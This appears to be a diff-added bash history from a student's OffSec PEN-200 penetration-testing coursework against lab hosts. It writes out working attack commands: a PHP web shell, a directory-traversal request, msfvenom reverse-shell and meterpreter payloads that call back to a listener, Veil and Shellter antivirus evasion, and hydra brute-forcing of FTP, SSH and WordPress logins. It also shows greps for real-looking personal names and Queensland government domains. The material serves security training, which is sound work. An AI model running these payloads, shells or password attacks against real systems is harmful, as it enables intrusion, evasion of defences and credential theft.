+ 1319  /opt/nessus/sbin/nessuscli chpassword bob
+ 1320  /opt/nessus/sbin/nessuscli chpassword admin
+ 1321  sudo /opt/nessus/sbin/nessuscli chpassword admin
+ 1322  sudo /opt/nessus/sbin/nessuscli chpasswd admin
+ 1323  curl http://192.168.162.54:27498/../../../../../../../../../../../../windows/win.ini
+ 1326  curl http://$IP/robots.txt
+ 1328  script 9.2.6.vm1.script
+ 1329  script 9.2.6.vm2.script
+ 1330  script 9.2.6.vm3.script
+ 1331  passwd
+ 1333  export IP=192.168.162.52
+ 1334  curl http://$IP
+ 1335  script 9.3.4.vm1.script
+ 1336  script 9.3.4.vm2.script
+ 1339  cd offsec/pen200/9
+ 1340  curl -o rockyou_50.txt http://192.168.162.52/rockyou_50.txt
+ 1341  python
+ 1342  echo $RANDOM | md5sum >> random.txt
+ 1344  ..
+ 1345  git add --al
+ 1347  git commit -m "continuing web application attacks"
+ 1352  export IP=192.168.150.52
+ 1353  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+ 1355  cd /home/kali/Desktop/
+ 1356  touch flag.txt
+ 1360  nc -nv $IP 80
+ 1361  cd /var/log/apache2/
+ 1363  nc -nvlp 60000
+ 1366  nc -nvv $IP 60000
+ 1369  export IP=192.168.156.52
+ 1370  iptables -A OUTPUT -p tcp --dport 60000 -j ACCEPT
+ 1371  sudo iptables -A OUTPUT -p tcp --dport 60000 -j ACCEPT
+ 1372  nc -nv $IP 60000
+ 1373  socat FILE:`tty`,raw,echo=0 TCP:$IP:60000
+ 1375  cd /Documents/git/bravo/offsec/pen200
+ 1376  cd /Documents/git/bravo/
+ 1378  cd Documents/git/bravo/offsec/pen200/9
+ 1379  echo <?php echo shell_exec($_GET['cmd']); ?> >> evil.txt
+ 1380  echo "<?php echo shell_exec($_GET['cmd']); ?>" >> evil.txt
+ 1381  echo "" >> evil.txt
+ 1385  git commit -m "finished web application"
+ 1388  ping ucq-cyber-p001
+ 1389  ping www.google.com
+ 1390  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
+ 1391  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q asdf
+ 1393  export IP=192.168.126.52
+ 1394  ssh offsec@IP
+ 1395  ssh offsec@$IP
+ 1396  ssh student@$IP
+ 1397  cd Documents/git/bravo/offsec/pen200/10
+ 1399  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 10.2.5.3.vm1.script
+ 1400  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 10.2.5.4.vm2.script
+ 1402  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 10.2.5.5.vm3.script
+ 1403  python -c 'print("A"*100)'
+ 1404  python -c 'print("A"*120)'
+ 1406  export IP=192.168.126.56
+ 1408  sudo apt install notepad-plus-plus
+ 1409  sudo apt install snap
+ 1410  snap
+ 1413  sudo snap install notepad-plus-plus
+ 1417  git commit -m "buffer overflows continuing"
+ 1419  sudo nano /etc/fstab
+ 1420  sudo reboot now
+ 1422  grep "leighmdixon" *
+ 1423  grep "qld.gov.au" > qld.gov.au.lst
+ 1424  grep "qld.gov.au" *  | tee >  qld.gov.au.lst
+ 1425  grep "qld.gov.au" *
+ 1428  grep "adamjstein" *
+ 1429  grep "premiers.qld.gov.au
+ 1430  grep "premiers.qld.gov.au" *
+ 1431  grep "ucareqld.com.au" *
+ 1433  /bin/python3.10 /home/kali/Documents/git/bravo/offsec/pen200/11/3/createbadcharacters.py
+ 1434  cd /home/kali/Documents/git/bravo/offsec/pen200/13-ClientSideAttacks
+ 1435  sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
+ 1436  cd fingerprintjs2
+ 1437  cd fingerprintjs-master
+ 1438  cd playground
+ 1440  python -m http.server
+ 1441  cd ..
+ 1445  git commit -m "client side attacks"
+ 1448  cd Documents/git/bravo/offsec/pen200/11
+ 1449  cd Documents/git/bravo/offsec/pen200
+ 1450  cd 10
+ 1453  cd 11
+ 1454  ls -a
+ 1455  cd 3
+ 1458  sha256sum exploit.txt
+ 1459  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+ 1460  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300  -q 386F4337
+ 1461  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+ 1462  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000  -q 386F4337
+ 1463  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 800  -q 386F4337
+ 1464  ^[[200~/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800~
+ 1466  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
+ 1467  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 800  -q 42306142
+ 1468  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x01"
+ 1469  rdesktop -u student -p lab 192.168.178.10 -5 -K -r clipboard:CLIPBOARD
+ 1471  cd Dowo
+ 1472  cd Downloads
+ 1474  rm pwk2.ovpn
+ 1475  ls-la
+ 1477  ls -al
+ 1480  cd /usr/share/exploitdb
+ 1481  cd shellcodes
+ 1483  cd windows
+ 1485  cat 13560.txt
+ 1488  grep Exploits *.nse /usr/share/nmap/scripts
+ 1489  grep Exploits /usr/share/nmap/scripts/*.nse
+ 1490  grep Exploits /usr/share/nmap/scripts *.nse
+ 1491  grep Exploit /usr/share/nmap/scripts/*.nse
+ 1492  grep windows /usr/share/nmap/scripts/*.nse
+ 1493  grep -i windows /usr/share/nmap/scripts/*.nse
+ 1494  grep -i windows /usr/share/nmap/scripts/*.nse | wc -c
+ 1496  git commit -m "evading protected view"
+ 1499  cd Documents/gi
+ 1500  cd Documents/git
+ 1501  git clone https://github.com/beefproject/beef
+ 1502  cd beef
+ 1503  ./install
+ 1505  cd bravo/offsec/pen200/13
+ 1506  cd bravo/offsec/pen200
+ 1507  git pull
+ 1508  cd 13-ClientSideAttacks
+ 1510  echo "gotcha" >> index.html
+ 1511  nc -nlvp 80
+ 1513  sudo apt update bundler
+ 1514  sudo apt upgrade bundler
+ 1515  bundle exec msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.119.125 lport=5555 -f exe > reverse_tcp.exe
+ 1516  bundle update
+ 1517  cd /usr/share/metasploit-frame
+ 1519  gem -update --system
+ 1520  cd /usr
+ 1521  cd share
+ 1522  cd metasploit-framework
+ 1523  gem install bundler
+ 1524  sudo gem install bundler
+ 1525  bundle install
+ 1526  gem update --system
+ 1528  cd home
+ 1529  cd kali/Documents/git/bravo/offsec/pen200/13-ClientSideAttacks
+ 1531  sudo apt update
+ 1532  sudo apt upgrade
+ 1533  rm reverse_tcp.exe
+ 1534  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.119.125 lport=5555 -f exe > reverse_tcp.exe
+ 1535  lhost=192.168.119.125 lport=5555 -f exe > reverse_tcp.exe
+ 1536  msfvenom -p windows/shell_reverse_tcp ahost=192.168.119.125 lport=5555 -f exe > ncshell.exe
+ 1538  rm ncshell.exe
+ 1539  msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.125 lport=5555 -f exe > ncshell.exe
+ 1541  cd ../../
+ 1542  cd 16-FileTransfers
+ 1543  nc -n 192.168.125.52:5000
+ 1544  nc -n 192.168.125.52 -p 5000
+ 1545  ./GLaDOP -h
+ 1546  ./GLaDOP --help
+ 1549  socat FILE:`tty`,raw,echo=0 TCP:$IP:5000
+ 1550  socat FILE:`tty`,raw,echo=0 TCP:192.168.125.52:5000
+ 1552  nc -C 192.168.125.52 5000
+ 1554  stty -a
+ 1555  ^[[200~stty raw -echo
+ 1559  nc -nlvp 5555
+ 1561  socat file:`tty`,raw,echo=0 tcp-listen:4444\n
+ 1562  rdesktop -u student -p lab 192.168.125.55 -5 -K -r clipboard:CLIPBOARD
+ 1563  ping 192.168.125.55
+ 1564  nc -nv $IP 25
+ 1565  nc -C $IP 25
+ 1567  nc -h
+ 1570  export IP=192.168.125.55
+ 1573  reset
+ 1581  sudo systemctl /start apache2
+ 1583  wget 192.168.119.125
+ 1584  powershell
+ 1585  ps
+ 1593  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 16.2.6.vm2.script
+ 1605  cd Documents/git/bravo/offsec/pen200/16-FileTransfers
+ 1608  scp -P 2222 student@$IP:/challenge/try-harder.mp3 try-harder.mp3
+ 1613  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 16.2.6.vm2.1.script
+ 1614  scp -P 2222 student@$IP:/challenge/try-harder.mp3 ~/try-harder.mp3
+ 1615  cd /var
+ 1616  find "pureftp" /
+ 1617  find "pureftp" / >> /dev/null
+ 1618  cd /etc
+ 1619  cd pure-ftpd
+ 1620  cat pure
+ 1621  cat pure-ftpd.conf
+ 1623  find "ftphome"
+ 1624  find "ftphome" /
+ 1625  find "ftphome" / | grep "ftphome"
+ 1626  cd Documents
+ 1629  cd ftphome
+ 1630  cp /home/kali/try-harder.mp3 /ftphome/try-harder.mp3
+ 1631  sudo cp /home/kali/try-harder.mp3 /ftphome/try-harder.mp3
+ 1632  sudo nano /etc/pure-ftpd/pure-ftpd.conf\n
+ 1634  cd /home
+ 1636  sudo apt uninstall pure-ftpd
+ 1637  sudo apt-get --purge remove pure-ftpd
+ 1638  sudo apt update && sudo apt install pure-ftpd
+ 1640  scp -P 2222 student@$IP:/challenge/try-harder-ftp-service /home/kali/ try-harder-ftp-service
+ 1641  scp -P 2222 student@$IP:/challenge/try-harder-ftp-service /home/kali/try-harder-ftp-service
+ 1642  cd /home/kali/
+ 1643  purepw show offsec
+ 1644  pure-pw show offsec
+ 1645  cat try-harder-ftp-service
+ 1646  sudo puredb /etc/pureftpd.pdb
+ 1647  puredb
+ 1648  PureDB
+ 1649  cat /etc/pure-ftpd
+ 1650  sudo cat pure-ftpd.conf
+ 1652  nc -Cvv offsec:offsec@127.0.0.1 21
+ 1655  sudo pure-pw show offsec
+ 1656  cd /ftphome/./
+ 1659  touch /etc/pure-ftpd/pureftpd.passwd\n
+ 1660  sudo touch /etc/pure-ftpd/pureftpd.passwd\n
+ 1661  systemctl stop pure-ftpd; systemctl start pure-ftpd\n
+ 1665  nc -Cvv 127.0.0.1 21
+ 1666  cd /home/kali
+ 1668  ./try-harder-ftp-service
+ 1672  rm powershell-uploads
+ 1673  sudo systemctl start apache2
+ 1674  sudo chown www-data:/var/www/uploads/
+ 1675  sudo chown www-data: /var/www/uploads/
+ 1676  cd /etc/pure-ftpd
+ 1677  pureftpd.pdb
+ 1678  sudo nano pure-ftpd.conf
+ 1679  cd auth
+ 1680  cd 60pdb
+ 1681  cat 60pdb
+ 1684  pure-pw users list
+ 1685  pure-pw list
+ 1686  sudo pure-pw userdel offsec
+ 1687  sudo pure-pw list
+ 1688  groups
+ 1689  sudo groupadd ftpgroup
+ 1690  group
+ 1691  groups --help
+ 1692  groups offsec
+ 1693  sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+ 1694  users
+ 1695  sudo cat /etc/passwd
+ 1696  sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+ 1697  sudo pure-pw mkdb
+ 1698  sudo mkdir -p /ftphome
+ 1699  sudo chown -R ftpuser:ftpgroup /ftphome/
+ 1700  sudo systemctl restart pure-ftpd
+ 1705  nc -Cvv $IP 25
+ 1707  echo $TERM
+ 1708  stty
+ 1709  stty raw -echo\n
+ 1710  fg
+ 1711  sudo openvpn Downloads/universal.ovpn
+ 1714  ssh student@$IP -p 5000 -o "UserKnownHostsFile=/dev/null" | tee 16.2.6.vm2.1.script
+ 1715  nc 192.168.132.10 9000
+ 1716  export IP=192.168.125.52 && nc -Cvv $IP 500
+ 1718  apt install wine
+ 1719  sudo apt install wine
+ 1720  sudo apt install shellter
+ 1722  socat TCP:$IP:5000 -\n
+ 1723  nc -Cvv $IP 5000
+ 1724  export IP=192.168.125.10
+ 1726  rdesktop -h
+ 1728  cd Documents/git/bravo/offsec/www
+ 1729  cd Documents/git/bravo/offsec
+ 1730  mkdir www
+ 1731  cd www
+ 1734  rm upload.php
+ 1735  cd ./.
+ 1737  nano -ilm upload.php
+ 1738  sudo chown www-data: /home/kali/Documents/git/bravo/offsec/www/uploads
+ 1739  python -m http.server 80
+ 1741  mkdir uploads
+ 1742  sudo mkdir uploads
+ 1744  touch upload.php
+ 1745  sudo su 
+ 1747  git commit -m "antivirus evasion"
+ 1750  pwd
+ 1751  export IP=192.168.125.53
+ 1752  find "putty.exe"
+ 1753  find "putty.exe" /
+ 1754  find "putty.exe" / | grep "putty.exe"
+ 1755  sudo find "putty.exe" / | grep "putty.exe"
+ 1756  rdesktop -u student -p lab $IP -5 -K -r clipboard:CLIPBOARD
+ 1759  ftp -A $IP
+ 1760  cd Documents/git/bravo/offsec/pen200/17-AntivirusEvasion
+ 1761  curl -o putty.exe https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
+ 1763  sudo execute "dpkg --add-architecture i386 && apt-get update &&\napt-get install wine32:i386"\n
+ 1764  sudo dpkg --add-architecture i386 && apt-get update &&\napt-get install wine32:i386"\n\n
+ 1765  sudo dpkg --add-architecture i386 && apt-get update &&\napt-get install wine32:i386\n\n
+ 1766  sudo dpkg --add-architecture i386 && apt-get update\n\n
+ 1767  sudo apt-get install wine32:i386\n\n
+ 1768  sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32\n
+ 1769  mv ~/.wine ~/.wine.old
+ 1770  shellter
+ 1771  cp /var/lib/veil/output/source/payload.bat payload.bat
+ 1773  nc -nlvp 5000
+ 1774  ifoncig
+ 1775  msfconsole -x "use exploit/multi/handler; set RHOST 192.168.125.53; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.125"
+ 1776  git clone https://github.com/Veil-Framework/Veil.git && cd Veil/ && ./config/setup.sh --force --silent
+ 1777  sudo git clone https://github.com/Veil-Framework/Veil.git && cd Veil/ && ./config/setup.sh --force --silent
+ 1778  ./Veil.py --setup
+ 1779  ./config/setup.sh --force --silent
+ 1780  sudo rm -r /var/lib/veil
+ 1781  pip install pyinstaller
+ 1782  pip install --upgrade pyinstaller
+ 1783  cd /home/kali/.local
+ 1784  cd bin
+ 1785  cd /usr/share
+ 1786  rm Veil
+ 1787  rm -f Veil
+ 1788  rm -help
+ 1789  rm -h
+ 1790  rm --help
+ 1791  rm -rdf Veil
+ 1792  cd Veil
+ 1793  sudo rm -r Veil
+ 1794  sudo apt install veil-evasion
+ 1795  veil-evasion
+ 1796  cd config
+ 1797  ./setup.sh
+ 1798  veil
+ 1799  /usr/share/veil/config/setup.sh --force --silent
+ 1802  ./Veil.py
+ 1803  msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/rev_tcp; set lhost 192.168.119.125; set lport 4444; exploit"
+ 1804  msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.125; set lport 4444; exploit"
+ 1805  cd /home/kali/Documents/git/bravo/offsec/pen200/18-PrivilegeEscalation
+ 1806  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.1.2.2.vm1.script
+ 1810  ssh roo2@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm2.script
+ 1811  ssh root2@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm2.script
+ 1812  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm2.script
+ 1813  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm1.script
+ 1814  git commit -m "privilege escalations"
+ 1817  git commit -m "finished privilege escalation"
+ 1822  ipconfig
+ 1824  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 19.4.6.2.vm1.script
+ 1825  scp -P 2222 student@$IP:/challenge/flag.rar /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks
+ 1826  ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "[192.168.125.52]:2222"\n
+ 1827  scp -P 2222 student@$IP:/challenge/flag.rar /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks/flag.rar
+ 1828  scp -P 2222 student@$IP:/challenge/flag.zip /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks/flag.zip
+ 1829  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 19.4.6.2.vm2.script
+ 1830  cat /usr/share/john/password.lst
+ 1831  cat /usr/share/john/password.lst | wc
+ 1834  git clone https://github.com/danielmiessler/SecLists.git
+ 1836  cd Passwords
+ 1839  ifconfig
+ 1840  openssl passwd Password123
+ 1841  openssl passwd evil
+ 1842  nc -nlpv 4444
+ 1843  nc -nl -p 4444
+ 1844  nc --help
+ 1845  nc -help
+ 1846  nc -l -p 4444
+ 1847  cat megacorp-cewl.txt
+ 1848  cd Documents/git/bravo/offsec/pen200/19-PasswordAttacks
+ 1849  cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+ 1850  john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
+ 1851  mutated | wc
+ 1852  echo mutated | wc
+ 1853  cat mutated | wc
+ 1854  cat mutated.txt | wc
+ 1855  head mutated.txt
+ 1856  head -n 1000 mutated.txt
+ 1857  crunch 1 4 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
+ 1858  head crunch.txt
+ 1859  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+ 1860  sudo apt install crowbar
+ 1861  touch hash.txt
+ 1862  sudo john hash.txt --format=NT
+ 1863  john --help
+ 1864  john show
+ 1865  john --show
+ 1866  sudo john --show  hash.txt
+ 1867  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+ 1868  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT --show
+ 1869  john --show hash.txt
+ 1870  $JOHN
+ 1871  echo $JOHN
+ 1872  cd $JOHN
+ 1873  cd .john
+ 1874  sudo ls -la
+ 1875  cd /
+ 1876  cd var
+ 1878  cd root
+ 1879  su root
+ 1880  su
+ 1881  sudo bash
+ 1882  hashcat -b
+ 1883  sudo nano /etc/john/john.conf
+ 1884  cd /home/kali/Documents/git
+ 1885  cd SecLists
+ 1888  export IP=192.168.121.44
+ 1889  for i in $(echo $list); do; echo $(ping -cn 1 $i | cut -d "(" -f 2 | awk -F ")  " '{ print $1}' ) "--- $i"; done; 
+ 1890  export IP=192.168.121.52\n
+ 1891  hydra --help
+ 1892  hydra -h
+ 1893  export IP=192.168.125.52
+ 1894  hydra -l offsec -P /usr/share/wordlists/rockyou.txt -T 1 ftp://$IP
+ 1895  hydra -f -t 3 -l offsec -P /usr/share/seclists/Passwords/cirt-default-passwords.txt ftp://$IP
+ 1896  hydra -f -t 3 -l offsec -P /usr/share/john/password.lst ftp://$IP
+ 1897  hydra -l offsec -P /usr/share/john/password.lst  $IP ftp -t 3 -vV -R \n
+ 1898  hydra -R
+ 1899  hydra -l offsec -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  $IP ftp -vV -R \n
+ 1900  cat /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+ 1901  hydra -l offsec -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  $IP ftp -vV\n
+ 1902  hydra -l offsec -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  $IP ftp -vV -t 3\n
+ 1903  hydra -l offsec -P /usr/share/john/password.lst  $IP ftp  -vV\n
+ 1904  hydra -l offsec -P /usr/share/john/password.lst  $IP ftp  -vV -R\n
+ 1905  cd /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks
+ 1906  hydra
+ 1907  hydra -l offsec -P /usr/share/john/password.lst  ftp://$IP\n
+ 1908  hydra -l offsec -P /usr/share/john/password.lst  ftp://$IP -vV\n
+ 1909  hydra -l offsec -P ./500worst.txt  ftp://$IP -vV -t 3\n
+ 1911  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 $IP request_method /
+ 1912  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 $IP
+ 1913  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 $IP GET /
+ 1914  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 $IP http-get /
+ 1915  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 -vV $IP http-get /
+ 1916  hydra -l offsec -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt -s 80 -vV $IP http-head /
+ 1917  hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 80 -vV $IP http-head /
+ 1918  curl -o users.txt http://192.168.125.52/users.txt
+ 1919  hydra -help
+ 1920  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username" -V
+ 1921  hydra -L users.txt -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username" -V
+ 1922  hydra -L steven -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username" -V
+ 1923  hydra -l steven -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -V
+ 1924  hydra -l steven -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vV
+ 1925  hydra -l steven -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=steven&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vV
+ 1926  hydra -l users.txt -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 1927  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 1928  hydra -L users.txt -P /home/kali/Documents/git/SecLists/Passwords/500-worst-passwords.txt    $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 1929  hydra -L users.txt -p pleasesubscribe  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 1930  hydra -L users.txt -p pleasesubscribe  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown" -vVF
+ 1931  hydra -L users.txt -p pleasesubscribe  $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Unknown username" -vVF
+ 1932  hydra -l michael -P /usr/share/wordlists/rockyou.txt   $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.52%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 1933  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP
+ 1934  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -vVf
+ 1935  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP -vVf
+ 1936  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP -vVf -s 2222
+ 1937  ssh offsec@$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
+ 1938  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 19.4.6.8.vm6.script
+ 1939  scp -P 2222 student@$IP:/home/student/passwords.txt /home/kali/Documents/git/bravo/offsec/pen200/19-PasswordAttacks/7.passwords
+ 1940  hydra -l "shadow-man" -P 7.passwords ssh://$IP -vVf -s 2222
+ 1941  ssh shadow-man@$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
+ 1943  cd 20-PortTunnelling
+ 1944  cd /var/www
+ 1945  cd /uploads
+ 1946  cd html
+ 1947  ls -la
+ 1948  sudo service apache2 start
+ 1949  /etc/init.d/apache2 restart
+ 1950  cd ../
+ 1951  cd uploads
+ 1952  ls
+ 1954  ssh student$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
+ 1955  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null"
+ 1956  cd /home/kali/Documents/git/bravo/offsec/pen200/20-PortTunnelling
+ 1957  nc -l -p 5555
+ 1959  proxychains sudo nmap -T4 -sS --open -p 3000-35000 $IP\n
+ 1960  proxychains sudo nmap -T4 -sS --open -p 30000-35000 $IP\n
+ 1961  proxychains sudo nmap -T4 -sS -vv -p 30000-35000 $IP\n
+ 1962  proxychains sudo nmap -T4 -sT -vv -p 30000-35000 $IP\n
+ 1963  proxychains sudo nmap -T4 -sT -vv $IP\n
+ 1964  sudo proxychains nmap -sT $IP\n
+ 1965  sudo proxychains nmap -sT $IP -p30000-35000\n
+ 1966  proxychains ping 17.0.0.1:34023
+ 1967  ssh student@$IP -p 34023 -D -o "UserKnownHostsFile=/dev/null"
+ 1968  proxychains ssh student@$127.0.0.1 -p 34023 -D -o "UserKnownHostsFile=/dev/null"
+ 1969  proxychains ssh student@$127.0.0.1 -p 34023 -D
+ 1970  proxychains ssh 127.0.0.1 34023
+ 1971  proxychains ssh student@127.0.0.1 34023
+ 1972  proxychains ssh student@127.0.0.1 -p 34023 -D
+ 1973  ssh --help
+ 1974  ssh -h
+ 1975  proxychains ssh student@127.0.0.1:34023
+ 1976  proxychains netcat 127.0.0.1 34023
+ 1977  netcat $IP 34023
+ 1978  proxychains netcat $IP 34023
+ 1979  nc 127.0.0.1 34023
+ 1980  proxychains netcat -vzb 127.0.0.1 34023
+ 1981  proxychains ssh student@127.0.0.1 -p 34023
+ 1983  proxychains nc $IP 34023
+ 1984  sudo proxychains nmap -sT 127.0.0.1 -p30000-35000\n
+ 1986  ssh -R 127.0.0.1:8081:127.0.0.1:80 student@$IP
+ 1987  ssh -R 127.0.0.1:8081:127.0.0.1:80 student@$IP -p 2222
+ 1988  ssh -D 1337 student@$IP -fN
+ 1989  ssh -D 1337 student@$IP -p 2222 -fN
+ 1990  ssh -D 9999 student@$IP -p 2222 -fN
+ 1991  ssh -D localhost:9000 -f -N student@$IP -p 2222
+ 1992  sudo nano -ilm /etc/proxychains
+ 1994  sudo restart -f
+ 1995  reboot
+ 1996  sudo openvpn Downloads/pwk2.ovpn
+ 1997  curl --help
+ 1998  curl 127.0.0.1:8080
+ 1999  curl http://127.0.0.1:8080
+ 2000  exit
+ 2002  ssh -L 80:$IP:80 student@$IP -p 2222
+ 2003  ssh -L 8080:127.0.0.1:80 student@$IP -p 2222
+ 2004  ssh -L 8080:$IP:80 student@$IP -p 2222
+ 2006  ssh -L 8080:192.168.121.52:80 student@192.168.121.52 -p 2222\n
+ 2007  ssh -L 8080:127.0.0.1:80 student@192.168.121.52 -p 2222
+ 2008  ssh -L 127.0.0.1:8080:127.0.0.1:80 student@192.168.121.52 -p 2222
+ 2009  ssh -L 8080:localhost:80 student@192.168.121.52 -p 2222
+ 2010  ssh -D localhost:80 -f -N student@$IP -p 2222
+ 2011  ssh -L 6666:localhost:80 student@192.168.121.52 -p 2222
+ 2012  ssh -N -L 6666:127.0.0.1:80 student@192.168.121.52 -p 2222
+ 2013  ssh -D 8888 student@IP -p 2222
+ 2016  ssh -D 8888 student@$IP -p 2222
+ 2017  proxychains wpscan --url http://127.0.0.1 --passwords /usr/share/wordlists/fasttrack.txt
+ 2018  proxychains wpscan --url http://127.0.0.1 --passwords /usr/share/wordlists/john.lst
+ 2019  proxychains wpscan --url 127.0.0.1
+ 2020  proxychains wpscan --url 127.0.0.1:80
+ 2021  wpscan --help
+ 2022  wpscan
+ 2023  wpscan --update
+ 2024  proxychains wpscan --url 127.0.0.1 --proxy socks5://127.0.0.1:80
+ 2025  proxychains wpscan --url 127.0.0.1 --proxy socks5://127.0.0.1:80 -v
+ 2026  proxychains wpscan --url 127.0.0.1 --proxy socks5://127.0.0.1:8080 -v
+ 2027  proxychains wpscan --url localhost --proxy socks5://127.0.0.1:8080 -v
+ 2028  proxychains wpscan --url localhost --proxy socks5://localhost:80 -v
